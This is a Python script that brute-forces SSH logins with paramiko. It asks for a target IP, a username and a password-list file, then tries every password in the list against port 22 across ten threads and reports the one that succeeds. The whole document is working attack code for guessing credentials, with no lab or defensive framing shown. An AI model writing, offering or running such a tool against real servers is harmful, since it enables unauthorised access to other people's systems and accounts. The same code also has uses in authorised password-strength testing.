import paramiko
import sys
import os
import threading

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

def brute_force(passwords):
    for password in passwords:
        try:
            response = ssh_connect(password)

            if response == 0:
                print('Password found: ' + password)
                os._exit(0)
            elif response == 1:
                print('No luck with password: ' + password)
        except Exception as e:
            print(e)

with open(password_file, 'r') as file:
    passwords = [line.strip() for line in file.readlines()]

# Number of threads you want to use
num_threads = 10

password_chunks = [passwords[i:i + len(passwords) // num_threads] for i in range(0, len(passwords), len(passwords) // num_threads)]

threads = []
for chunk in password_chunks:
    thread = threading.Thread(target=brute_force, args=(chunk,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
